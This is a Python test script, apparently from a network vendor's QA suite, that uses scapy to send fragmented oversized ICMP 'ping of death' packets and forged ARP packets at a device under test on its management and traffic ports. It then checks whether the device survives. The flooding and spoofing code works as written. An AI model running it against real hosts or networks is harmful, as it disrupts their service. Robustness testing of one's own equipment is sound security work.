#!/usr/bin/python
# -*- coding: utf-8 -*-

# Filename: 100.1.py
#-----------------------------------------------------------------------------------
#Purpose: pingofdeath
#
#
#Notes:
#History:
#        06/19/2013- Jefferson Sun,Created
#
#Copyright(c): Transition Networks, Inc.2013
#------------------------------------------------------------------------------------

from attack import *
from scapy.all import *
from PubModuleVitesse import PubReadConfig

def pingofdeath(mgmtmac,trfcmac,ipsrc,ipdst,mgmtnic,trfcnic,num):
        AttackTest = AttackCases(ipdst)
        try:
                print "First to Test Management Port Attack"
                print "start sending 41x"+str(num)+ " packets"
                send(fragment(IP(dst=ipdst)/ICMP()/("X"*60000)),count=num,iface=mgmtnic)
                AttackTest.ChkDutSts()
                print "Start Testing Traffic Port Attack"
                conf.route.add(host=ipdst,dev=trfcnic)
                for i in range(100):
                        print "forge arp packets in order to use traffic port to do testing"
                        AttackTest.fgarp(trfcmac,ipsrc,ipdst,trfcnic)
                        print "Start to send 41x"+str(num/100)+" packets"
                        send(fragment(IP(dst=ipdst)/ICMP()/("X"*60000)),count=num/100,iface=trfcnic)
                conf.route.resync()
                AttackTest.ChkDutSts()
        except:
                print "FAIL"
                sys.exit()



if __name__ == "__main__":
        prmts = PubReadConfig("")
        num = 100
        mgmtnic = prmts.GetParameter("PC","MGMTNIC")
        trfcnic = prmts.GetParameter("PC","TRFCNIC")
        ipsrc = "192.168.3.187"
        ipdst = prmts.GetParameter("DUT1","IP")
#        temp = AttackCases(ipdst)
#        macsrc = temp.PubModuleEle.GetHwAddr(trfcnic)
        mgmtmac = prmts.GetParameter("PC","MGMTMAC")
        trfcmac = prmts.GetParameter("PC","TRFCMAC")
        print "===========Start Testing pingofdeath============="
        pingofdeath(mgmtmac,trfcmac,ipsrc,ipdst,mgmtnic,trfcnic,num)
        print "==========pingofdeath testing finished========"
        print "PASS"


